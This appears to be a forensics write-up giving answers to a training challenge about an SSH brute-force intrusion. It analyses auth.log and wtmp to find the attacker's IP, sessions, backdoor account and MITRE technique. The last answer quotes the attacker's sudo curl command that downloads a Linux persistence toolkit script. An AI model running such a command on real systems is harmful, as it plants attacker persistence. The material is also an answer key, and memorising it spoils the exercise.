# Brutus

#linux #auth.log #wtmp #brute_force #confluence

## Speech
```
In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
```

## The question

1. Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?
    - Lots of password failed by : 65.2.161.68
2. The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?
    - Line 281 we see an accepted password for root
3. Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?
    - Use the wtmp : `[7] [02549] [ts/1] [root] [pts/1] [65.2.161.68] [65.2.161.68] [2024-03-06T06:32:45,387923+00:00]`
4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
    - 37 (the first session number, 34, was closed imediatly because it was the brute force/automated tool that connect)
5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
    - cyberjunkie (we can see the creation of this user at line 333)
6. What is the MITRE ATT&CK sub-technique ID used for persistence?
    - Let's search for "MITRE ATT&CK create account" we get : T1136, only 3 sub-technique .001 is the local account
7. How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)
    - Connect on line 322 (with the accept password, also we must take the timestamp from wtmp and not auth so 6:32:45), then we received a disconnect from TA at line 355 timestamp : 6:37:24. 4min and 39s, so 4*60+39=279
8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
    - Line 375 /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh